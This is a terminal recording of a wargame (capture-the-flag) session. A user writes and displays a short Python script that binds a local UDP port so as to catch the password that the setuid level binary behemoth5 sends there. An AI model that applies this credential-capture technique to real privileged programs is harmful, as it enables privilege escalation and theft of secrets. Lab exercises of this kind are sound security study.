[7.368, "o", "$ cat /tmp/e_behemoth5.py\r\n\u001b[?25l\u001b[32;1H\u001b[1m-- INSERT --\u001b[m\u001b[32;13H\u001b[K\u001b[32;83H0,1\u001b[11CAll\u001b[1;1Himport os, socket, subprocess, sys\u001b[2;1H\u001b[K\u001b[32;83H2\u001b[2;1H\u001b[?25h\u001b[?25l\u001b[3;1H\u001b[K\u001b[32;83H3\u001b[3;1H\u001b[?25h\u001b[?25l# behemoth5: reads /etc/behemoth_pass/behemoth6 (as behemoth6, via setuid) and\u001b[4;1H\u001b[K\u001b[32;83H4\u001b[4;1H\u001b[?25h\u001b[?25l# sendto()s it as a UDP datagram to localhost:1337. Nobody is listening there,\u001b[5;1H\u001b[K\u001b[32;83H5\u001b[5;1H\u001b[?25h\u001b[?25l# so we bind the port first and the program hands us the password.\u001b[6;1H\u001b[K\u001b[32;83H6\u001b[6;1H\u001b[?25h\u001b[?25ls = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\u001b[7;1H\u001b[K\u001b[32;83H7\u001b[7;1H\u001b[?25h\u001b[?25ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\u001b[8;1H\u001b[K\u001b[32;83H8\u001b[8;1H\u001b[?25h\u001b[?25ls.bind((\"127.0.0.1\", 1337))\u001b[9;1H\u001b[K\u001b[32;83H9\u001b[9;1H\u001b[?25h\u001b[?25ls.settimeout(15)\u001b[10;1H\u001b[K\u001b[32;83H10,1\u001b[10;1H\u001b[?25h\u001b[?25lprint(\"listening on 127.0.0.1:1337\", flush=True)\u001b[11;1H\u001b[K\u001b[32;84H1\u001b[11;1H\u001b[?25h\u001b[?25lp = subprocess.Popen([\"/behemoth/behemoth5\"], env={})\u001b[12;1H\u001b[K\u001b[32;84H2\u001b[12;1H\u001b[?25h\u001b[?25ldata, addr = s.recvfrom(4096)\u001b[13;1H\u001b[K\u001b[32;84H3\u001b[13;1H\u001b[?25h\u001b[?25lprint(\"received %d bytes from %s: %r\" % (len(data), addr, data), flush=True)\u001b[14;1H\u001b[K\u001b[32;84H4\u001b[14;1H\u001b[?25h\u001b[?25lp.wait()\u001b[15;1H\u001b[K\u001b[32;84H5\u001b[15;1H\u001b[?25h\u001b[?25lprint(\"B5\" + \"DONE\", flush=True)\u001b[16;1H\u001b[K\u001b[32;84H6\u001b[16;1H\u001b[?25h\u001b[32;1H\u001b[K\u001b[?25l\u001b[32;83H16,0-1\u001b[8CAll\u001b[16;1H\u001b[?25h\u001b[?25l\u001b[32;83H\u001b[K\u001b[32;1H:wq\r\u001b[?2004l\u001b[>4;m\"/tmp/e_behemoth5.py\" [New] 16L, 668B written\r\u001b[23;2t\u001b[23;1t\r\r\r\n\u001b[?1004l\u001b[?2004l\u001b[?1l\u001b>\u001b[?1049l\u001b[23;0;0t\u001b[?25h\u001b[>4;m\u001b]3008;end=f925de7b-68d9-4ae8-9cac-5f2a408fe09d;exit=success\u001b\\\u001b]3008;start=8928ec03-6946-4738-87ef-f150bed06629;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=behemoth5;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/behemoth5\u001b\\\u001b[?2004h\u001b]0;behemoth5@behemoth: ~\u0007behemoth5@behemoth:~$ $ python3 /tmp/e_behemoth5.py\r\n"]
[0.186, "o", "cat /tmp/e_behemoth5.py\r\r\n\u001b[?2004l\r\u001b]3008;start=0bf5a565-3cfa-4998-8052-fab3a2eb8bc0;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=behemoth5;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/behemoth5\u001b\\"]
[0.001, "o", "import os, socket, subprocess, sys\r\r\n\r\r\n# behemoth5: reads /etc/behemoth_pass/behemoth6 (as behemoth6, via setuid) and\r\r\n# sendto()s it as a UDP datagram to localhost:1337. Nobody is listening there,\r\r\n# so we bind the port first and the program hands us the password.\r\r\ns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\r\r\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\r\ns.bind((\"127.0.0.1\", 1337))\r\r\ns.settimeout(15)\r\r\nprint(\"listening on 127.0.0.1:1337\", flush=True)\r\r\np = subprocess.Popen([\"/behemoth/behemoth5\"], env={})\r\r\ndata, addr = s.recvfrom(4096)\r\r\nprint(\"received %d bytes from %s: %r\" % (len(data), addr, data), flush=True)\r\r\np.wait()\r\r\nprint(\"B5\" + \"DONE\", flush=True)\r\r\n\r\r\n"]
[0.005, "o", "\u001b]3008;end=0bf5a565-3cfa-4998-8052-fab3a2eb8bc0;exit=success\u001b\\"]
